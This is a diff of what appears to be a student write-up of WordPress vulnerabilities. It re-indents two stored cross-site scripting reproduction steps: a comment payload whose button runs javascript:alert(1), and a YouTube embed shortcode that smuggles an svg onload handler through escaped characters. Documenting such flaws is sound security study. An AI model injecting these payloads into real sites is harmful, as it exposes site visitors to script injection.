@@ -16,12 +16,12 @@ Time spent: 10 hours spent in total
 	1. Go to any post.
 	2. Paste the following as a comment in text.
 			
-		<button onclick = "fire()">Click<button>
-		<script>
-		function fire() {
-		open('javascript:alert(1)');
+			<button onclick = "fire()">Click<button>
+			<script>
+			function fire() {
+			open('javascript:alert(1)');
 			}
-		</script>
+			</script>
 			  
 	3. Click the button.
 	4. Alert(1) will pop up.
@@ -51,7 +51,7 @@ Time spent: 10 hours spent in total
 	1. Login as a user with the ability to create new posts
 	2. In the post body add the followin gyoutube embed code:
 			
-		[embed src='https://youtube.com/embed/123\x3csvgonload=alert(1)\x3e'][/embed]
+			[embed src='https://youtube.com/embed/123\x3csvgonload=alert(1)\x3e'][/embed]
   - [ ] Affected source code:
     - [Link 3](https://klikki.fi/adv/wordpress2.html)
 
